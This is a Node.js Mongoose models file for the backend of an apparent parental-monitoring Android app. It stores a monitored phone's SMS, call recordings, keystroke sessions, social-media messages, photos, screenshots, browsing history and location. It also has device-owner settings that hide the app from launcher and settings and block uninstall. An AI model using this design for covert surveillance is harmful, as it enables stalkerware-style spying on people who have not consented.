const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');

const buildNotificationDedupeHash = (doc) => {
  const normalizedContent = typeof doc.content === 'string'
    ? doc.content
    : (typeof doc.title === 'string' ? doc.title : '');
  const raw = `${doc.deviceId || ''}||${doc.packageName || ''}||${normalizedContent}`;
  return crypto.createHash('sha1').update(raw).digest('hex');
};

// User Schema (Parents)
const userSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
    trim: true
  },
  password: {
    type: String,
    required: true,
    minlength: 6
  },
  name: {
    type: String,
    required: true,
    trim: true
  },
  devices: [{
    type: mongoose.Schema.Types.ObjectId,
    ref: 'Device'
  }],
  fcmToken: String,
  // Security PIN for device operations (unpair, etc.)
  securityPin: {
    type: String,
    default: null
  },
  // Photo storage quota tracking (in bytes)
  photoStorageUsed: {
    type: Number,
    default: 0
  },
  photoStorageLimit: {
    type: Number,
    default: 200 * 1024 * 1024 // 200MB default
  },
  createdAt: {
    type: Date,
    default: Date.now
  },
  lastLogin: Date
});

userSchema.pre('save', async function(next) {
  if (!this.isModified('password')) return next();
  this.password = await bcrypt.hash(this.password, 12);
  next();
});

userSchema.methods.comparePassword = async function(candidatePassword) {
  return await bcrypt.compare(candidatePassword, this.password);
};

const User = mongoose.model('User', userSchema);

// Device Schema (Child devices + Device Owner devices)
const deviceSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    unique: true
  },
  name: {
    type: String,
    required: true,
    default: 'Child Device'
  },
  alias: {
    type: String,
    default: null // User-defined display name
  },
  displayOrder: {
    type: Number,
    default: 0 // For custom ordering
  },
  model: String,
  androidVersion: String,
  owner: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  fcmToken: String,
  pairingCode: String,
  pairingCodeExpiry: Date,
  isOnline: {
    type: Boolean,
    default: false
  },
  lastSeen: {
    type: Date,
    default: Date.now
  },
  battery: {
    type: Number,
    default: 100
  },
  mobileDataEnabled: {
    type: Boolean,
    default: false
  },
  screenTime: {
    type: Number,
    default: 0 // minutes
  },
  location: {
    latitude: Number,
    longitude: Number,
    accuracy: Number,
    address: String,
    timestamp: Date
  },
  blockedApps: [String],
  // Permissions status from child device
  permissions: {
    location: { type: Boolean, default: false },
    backgroundLocation: { type: Boolean, default: false },
    camera: { type: Boolean, default: false },
    microphone: { type: Boolean, default: false },
    storage: { type: Boolean, default: false },
    callLog: { type: Boolean, default: false },
    contacts: { type: Boolean, default: false },
    sms: { type: Boolean, default: false },
    phone: { type: Boolean, default: false },
    notifications: { type: Boolean, default: false },
    usageStats: { type: Boolean, default: false },
    overlay: { type: Boolean, default: false },
    batteryOptimization: { type: Boolean, default: false },
    deviceAdmin: { type: Boolean, default: false },
    accessibility: { type: Boolean, default: false },
    restrictedSettings: { type: Boolean, default: false },
    lastUpdated: { type: Date, default: null }
  },
  settings: {
    screenMirrorEnabled: { type: Boolean, default: true },
    cameraEnabled: { type: Boolean, default: true },
    liveListenEnabled: { type: Boolean, default: true },
    callRecordEnabled: { type: Boolean, default: true },
    locationTrackEnabled: { type: Boolean, default: true }
  },
  // ========== GEOFENCES, KEYWORDS, SCREEN TIME LIMITS ==========
  geofences: [{
    name: String,
    latitude: Number,
    longitude: Number,
    radius: { type: Number, default: 200 }, // meters
    type: { type: String, enum: ['home', 'school', 'custom'], default: 'custom' },
    enabled: { type: Boolean, default: true },
    createdAt: { type: Date, default: Date.now }
  }],
  keywords: [{
    word: String,
    category: { type: String, enum: ['inappropriate', 'danger', 'custom'], default: 'custom' },
    enabled: { type: Boolean, default: true },
    createdAt: { type: Date, default: Date.now }
  }],
  screenTimeLimits: {
    dailyLimitMinutes: { type: Number, default: 0 }, // 0 = unlimited
    bedtimeStart: { type: String, default: null }, // "22:00"
    bedtimeEnd: { type: String, default: null }, // "07:00"
    perAppLimits: [{
      packageName: String,
      limitMinutes: Number
    }],
    enabled: { type: Boolean, default: false }
  },
  screenTimeHistory: [{
    date: { type: Date, default: Date.now },
    totalScreenTime: Number, // milliseconds
    appUsage: [{
      packageName: String,
      usageTime: Number,
      lastUsed: Number
    }]
  }],
  // ========== DEVICE OWNER MODE FIELDS ==========
  // Device mode: 'child' (default) or 'deviceOwner'
  mode: {
    type: String,
    enum: ['child', 'deviceOwner'],
    default: 'child'
  },
  // Device Owner provisioning status
  deviceOwnerProvisioned: {
    type: Boolean,
    default: false
  },
  provisioningDate: {
    type: Date,
    default: null
  },
  provisioningMethod: {
    type: String,
    enum: ['qr_code', 'adb', 'nfc', null],
    default: null
  },
  // Device Owner policies and settings
  deviceOwnerPolicies: {
    // App hiding - completely hide app from launcher/settings
    appHidden: { type: Boolean, default: false },
    hiddenTimestamp: { type: Date, default: null },
    // Uninstall protection via DPM
    uninstallProtected: { type: Boolean, default: true },
    // Factory reset protection PIN
    factoryResetPinEnabled: { type: Boolean, default: false },
    factoryResetPin: { type: String, default: null },
    // Accessibility auto-recovery
    accessibilityAutoRecover: { type: Boolean, default: true },
    accessibilityLastRecovered: { type: Date, default: null },
    accessibilityRecoverCount: { type: Number, default: 0 },
    // Remote permission granting (DO can grant runtime permissions)
    permissionsGranted: [{
      permission: String,
      grantedAt: { type: Date, default: Date.now }
    }],
    // Silent app install/uninstall
    silentInstallEnabled: { type: Boolean, default: true },
    installedApps: [{
      packageName: String,
      appName: String,
      installedAt: { type: Date, default: Date.now },
      source: { type: String, enum: ['remote', 'local'], default: 'remote' }
    }],
    uninstalledApps: [{
      packageName: String,
      appName: String,
      uninstalledAt: { type: Date, default: Date.now }
    }],
    // OEM optimizer status
    oemOptimizer: {
      manufacturer: { type: String, default: null },
      autoStartEnabled: { type: Boolean, default: false },
      batteryOptimizationDisabled: { type: Boolean, default: false },
      backgroundRunAllowed: { type: Boolean, default: false },
      lastOptimized: { type: Date, default: null }
    }
  },
  // ========== END DEVICE OWNER MODE FIELDS ==========
  createdAt: {
    type: Date,
    default: Date.now
  }
});

const Device = mongoose.model('Device', deviceSchema);

// Notification Schema
const notificationSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  packageName: {
    type: String,
    required: true
  },
  appName: String,
  title: String,
  content: String,
  imageUrl: String,
  isRead: {
    type: Boolean,
    default: false
  },
  readAt: {
    type: Date,
    default: null
  },
  timestamp: {
    type: Date,
    default: Date.now
  },
  dedupeHash: {
    type: String
  }
});

// Unique index to prevent duplicate notifications from dual uploads (WebSocket + REST)
// while still allowing repeated notifications with the same text at different times.
notificationSchema.index({ deviceId: 1, packageName: 1, title: 1, content: 1, timestamp: 1 }, {
  unique: true,
  partialFilterExpression: { title: { $exists: true } }
});
notificationSchema.index({ dedupeHash: 1 }, { unique: true, sparse: true });

notificationSchema.pre('save', function(next) {
  if (!this.dedupeHash) {
    this.dedupeHash = buildNotificationDedupeHash(this);
  }
  next();
});

notificationSchema.pre('insertMany', function(next, docs) {
  docs.forEach(doc => {
    if (!doc.timestamp) {
      doc.timestamp = new Date();
    }
    if (!doc.dedupeHash) {
      doc.dedupeHash = buildNotificationDedupeHash(doc);
    }
  });
  next();
});

// Auto-delete after 48 hours
notificationSchema.index({ timestamp: 1 }, { expireAfterSeconds: 172800 });

const Notification = mongoose.model('Notification', notificationSchema);

// Call Log Schema
const callLogSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  number: {
    type: String,
    required: true
  },
  name: String,
  type: {
    type: String,
    enum: ['incoming', 'outgoing', 'missed'],
    required: true
  },
  duration: {
    type: Number,
    default: 0 // seconds
  },
  hasRecording: {
    type: Boolean,
    default: false
  },
  recordingUrl: String,
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Unique index to prevent duplicates (same device, number, timestamp)
callLogSchema.index({ deviceId: 1, number: 1, timestamp: 1, type: 1 }, { unique: true });

// Auto-delete after 48 hours
callLogSchema.index({ timestamp: 1 }, { expireAfterSeconds: 172800 });

const CallLog = mongoose.model('CallLog', callLogSchema);

// App Usage Schema
const appUsageSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  packageName: {
    type: String,
    required: true
  },
  appName: String,
  usageTime: {
    type: Number,
    default: 0 // minutes
  },
  openCount: {
    type: Number,
    default: 0
  },
  date: {
    type: Date,
    default: Date.now
  }
});

// Auto-delete after 48 hours
appUsageSchema.index({ date: 1 }, { expireAfterSeconds: 172800 });

const AppUsage = mongoose.model('AppUsage', appUsageSchema);

// Location History Schema
const locationHistorySchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  latitude: {
    type: Number,
    required: true
  },
  longitude: {
    type: Number,
    required: true
  },
  accuracy: Number,
  address: String,
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Auto-delete after 48 hours
locationHistorySchema.index({ timestamp: 1 }, { expireAfterSeconds: 172800 });

const LocationHistory = mongoose.model('LocationHistory', locationHistorySchema);

// Photo/Gallery Schema
const photoSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  fileName: {
    type: String,
    required: true
  },
  filePath: String, // Original file path on device
  thumbnailBase64: String, // Thumbnail in base64 (for quick display)
  fullImageBase64: String, // Full image in base64 (or URL if stored externally)
  mimeType: {
    type: String,
    default: 'image/jpeg'
  },
  width: Number,
  height: Number,
  size: Number, // File size in bytes
  dateTaken: Date, // When the photo was taken
  // Photo source/album categorization
  source: {
    type: String,
    enum: ['Camera', 'Screenshot', 'WhatsApp', 'Telegram', 'Download', 'Other'],
    default: 'Other',
    index: true
  },
  // Location metadata (if available from EXIF)
  location: {
    latitude: Number,
    longitude: Number,
    address: String // Reverse geocoded address if available
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Auto-delete photos after 48 hours
photoSchema.index({ timestamp: 1 }, { expireAfterSeconds: 172800 });

const Photo = mongoose.model('Photo', photoSchema);

// SMS Schema
const smsSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  address: {
    type: String,
    required: true // Phone number
  },
  contactName: String,
  body: {
    type: String,
    required: true
  },
  type: {
    type: String,
    enum: ['inbox', 'sent', 'draft', 'outbox'],
    default: 'inbox'
  },
  read: {
    type: Boolean,
    default: false
  },
  date: {
    type: Date,
    required: true
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Unique index to prevent duplicates
smsSchema.index({ deviceId: 1, address: 1, body: 1, date: 1 }, { unique: true });

// Auto-delete after 48 hours
smsSchema.index({ timestamp: 1 }, { expireAfterSeconds: 172800 });

const SMS = mongoose.model('SMS', smsSchema);

// Screenshot Schema
const screenshotSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  imageData: {
    type: String, // Base64 encoded image
    required: true
  },
  width: Number,
  height: Number,
  capturedAt: {
    type: Date,
    default: Date.now
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Auto-delete screenshots after 24 hours
screenshotSchema.index({ timestamp: 1 }, { expireAfterSeconds: 86400 });

const Screenshot = mongoose.model('Screenshot', screenshotSchema);

// Browser History Schema
const browserHistorySchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  url: {
    type: String,
    required: true
  },
  title: String,
  browser: String, // Chrome, Samsung Browser, Firefox, etc.
  visitCount: {
    type: Number,
    default: 1
  },
  visitedAt: {
    type: Date,
    required: true
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Unique index to prevent duplicates (same device, url, visitedAt)
browserHistorySchema.index({ deviceId: 1, url: 1, visitedAt: 1 }, { unique: true });

// Auto-delete after 48 hours
browserHistorySchema.index({ timestamp: 1 }, { expireAfterSeconds: 172800 });

const BrowserHistory = mongoose.model('BrowserHistory', browserHistorySchema);

// Keystroke Session Schema for grouped keystroke data
const keystrokeSessionSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  sessionId: {
    type: String,
    required: true,
    unique: true,
    index: true
  },
  appPackage: {
    type: String,
    required: true
  },
  appName: {
    type: String,
    required: true
  },
  contactName: {
    type: String,
    default: 'Unknown'
  },
  messages: [{
    timestamp: {
      type: Date,
      required: true
    },
    text: {
      type: String,
      required: true
    },
    fieldType: {
      type: String,
      enum: ['message', 'search', 'comment', 'text'],
      default: 'text'
    }
  }],
  messageCount: {
    type: Number,
    default: 0
  },
  firstMessageTime: {
    type: Date,
    required: true
  },
  lastMessageTime: {
    type: Date,
    required: true
  },
  // Risk analysis fields
  riskLevel: {
    type: String,
    enum: ['LOW', 'MEDIUM', 'HIGH'],
    default: 'LOW'
  },
  flaggedKeywords: [{
    type: String
  }],
  sentiment: {
    type: String,
    enum: ['Positive', 'Neutral', 'Negative'],
    default: 'Neutral'
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// Compound indexes for efficient querying
keystrokeSessionSchema.index({ deviceId: 1, timestamp: -1 });
keystrokeSessionSchema.index({ deviceId: 1, appPackage: 1 });
keystrokeSessionSchema.index({ deviceId: 1, riskLevel: 1 });

// Auto-delete after 7 days (privacy-conscious retention)
keystrokeSessionSchema.index({ timestamp: 1 }, { expireAfterSeconds: 604800 });

const KeystrokeSession = mongoose.model('KeystrokeSession', keystrokeSessionSchema);

// Pairing Code Schema (temporary)
const pairingCodeSchema = new mongoose.Schema({
  code: {
    type: String,
    required: true,
    unique: true
  },
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  expiresAt: {
    type: Date,
    required: true
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

// Auto-expire codes using the expiresAt field (24 hours from creation)
pairingCodeSchema.index({ expiresAt: 1 }, { expireAfterSeconds: 0 });

const PairingCode = mongoose.model('PairingCode', pairingCodeSchema);

// ================== SOCIAL MEDIA MODELS ==================

// Social Media Message Schema
const socialMessageSchema = new mongoose.Schema({
  message_id: {
    type: String,
    required: true,
    unique: true
  },
  device_id: {
    type: String,
    required: true,
    index: true
  },
  // App info
  app_package: {
    type: String,
    required: true
  },
  app_name: {
    type: String,
    required: true
  },
  // Contact info
  contact_name: {
    type: String,
    required: true,
    index: true
  },
  contact_identifier: {
    type: String,
    required: true
  },
  // Message content
  message_text: {
    type: String,
    required: true
  },
  timestamp: {
    type: Number,
    required: true
  },
  message_type: {
    type: String,
    enum: ['SENT', 'RECEIVED'],
    required: true
  },
  // Media
  media_type: {
    type: String,
    enum: ['PHOTO', 'VIDEO', 'VOICE', 'STICKER', 'FILE', 'LOCATION']
  },
  // Group info
  is_group_chat: {
    type: Boolean,
    default: false
  },
  group_name: String,
  sender_in_group: String,
  // Content hash for deduplication (auto-generated in pre-save hook)
  contentHash: {
    type: String
  },
  // Timestamps
  created_at: {
    type: Date,
    default: Date.now
  }
});

// Compound indexes for fast queries
socialMessageSchema.index({ device_id: 1, app_package: 1, contact_name: 1, timestamp: 1 });
socialMessageSchema.index({ device_id: 1, timestamp: -1 });

// Content-based dedup index: prevents identical messages with the same
// device/app/text key (timestamp-independent).
// Uses a pre-save hook to generate a stable content hash for dedup.
socialMessageSchema.pre('save', function(next) {
  if (!this.contentHash) {
    const normalizedText = typeof this.message_text === 'string' ? this.message_text : this.message_text;
    const raw = `${this.device_id}||${this.app_package}||${normalizedText}`;
    this.contentHash = crypto.createHash('md5').update(raw).digest('hex');
  }
  next();
});

socialMessageSchema.index({ contentHash: 1 }, { unique: true, sparse: true });

// Auto-delete after 90 days
socialMessageSchema.index({ created_at: 1 }, { expireAfterSeconds: 7776000 });

const SocialMessage = mongoose.model('SocialMessage', socialMessageSchema);

// Social Media Contact Schema
const socialContactSchema = new mongoose.Schema({
  device_id: {
    type: String,
    required: true
  },
  app_package: {
    type: String,
    required: true
  },
  contact_name: {
    type: String,
    required: true
  },
  contact_identifier: {
    type: String,
    required: true
  },
  profile_photo: String, // Base64
  last_message_time: {
    type: Number,
    default: 0
  },
  last_message_text: String,
  last_message_type: {
    type: String,
    enum: ['SENT', 'RECEIVED']
  },
  message_count: {
    type: Number,
    default: 0
  },
  unread_count: {
    type: Number,
    default: 0
  },
  updated_at: {
    type: Date,
    default: Date.now
  }
});

// Unique compound index
socialContactSchema.index({ device_id: 1, app_package: 1, contact_name: 1 }, { unique: true });
socialContactSchema.index({ device_id: 1, last_message_time: -1 });

const SocialContact = mongoose.model('SocialContact', socialContactSchema);

// ================== INSTALLED APPS MODEL ==================
// Full list of installed apps on child device (for DO hide/uninstall feature)
const installedAppSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  packageName: {
    type: String,
    required: true
  },
  appName: {
    type: String,
    required: true
  },
  isSystemApp: {
    type: Boolean,
    default: false
  },
  isEnabled: {
    type: Boolean,
    default: true
  },
  isHidden: {
    type: Boolean,
    default: false
  },
  lastSeenAt: {
    type: Date,
    default: Date.now
  }
});

// Compound unique index: one entry per app per device
installedAppSchema.index({ deviceId: 1, packageName: 1 }, { unique: true });

const InstalledApp = mongoose.model('InstalledApp', installedAppSchema);

// ==========================================
// CALL RECORDING SCHEMA
// ==========================================
const callRecordingSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true
  },
  fileName: {
    type: String,
    required: true
  },
  fileUrl: {
    type: String,
    default: null
  },
  fileSize: {
    type: Number,
    default: 0
  },
  duration: {
    type: Number,
    default: 0
  },
  phoneNumber: {
    type: String,
    default: 'Unknown'
  },
  contactName: {
    type: String,
    default: null
  },
  callType: {
    type: String,
    enum: ['incoming', 'outgoing', 'unknown'],
    default: 'unknown'
  },
  timestamp: {
    type: Date,
    required: true
  },
  listened: {
    type: Boolean,
    default: false
  },
  listenedAt: {
    type: Date,
    default: null
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

// Index for efficient queries
callRecordingSchema.index({ deviceId: 1, timestamp: -1 });

// Auto-delete recordings after 30 days
callRecordingSchema.index({ createdAt: 1 }, { expireAfterSeconds: 30 * 24 * 60 * 60 });

const CallRecording = mongoose.model('CallRecording', callRecordingSchema);

module.exports = {
  User,
  Device,
  Notification,
  CallLog,
  AppUsage,
  LocationHistory,
  Photo,
  SMS,
  Screenshot,
  BrowserHistory,
  KeystrokeSession,
  PairingCode,
  SocialMessage,
  SocialContact,
  InstalledApp,
  CallRecording
};
